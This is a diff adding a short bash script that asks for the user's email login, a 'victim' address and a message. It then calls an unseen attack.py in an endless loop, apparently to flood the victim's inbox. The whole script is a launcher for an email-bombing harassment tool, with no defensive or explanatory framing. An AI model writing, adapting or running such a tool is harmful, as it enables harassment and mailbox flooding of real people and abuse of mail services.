@@ -1,0 +1,17 @@
+#!/bin/bash
+echo -en "\e[0m\e[1;35mmail: \e[0m\e[2m"
+read mail
+echo -en "\e[0m\e[1;35mpassword: \e[0m\e[2m"
+read -s passw
+echo #space
+echo -en "\e[0m\e[1;35mmail (victim): \e[0m\e[2m"
+read cc
+echo -en "\e[0m\e[1;35mmessage: \e[0m\e[2m"
+read msj
+echo -en "\e[0m"
+
+while :;
+do
+ran=$(echo -e "$((1 + RANDOM % 9))")
+python attack.py $ran $cc $msj $mail $passw
+done
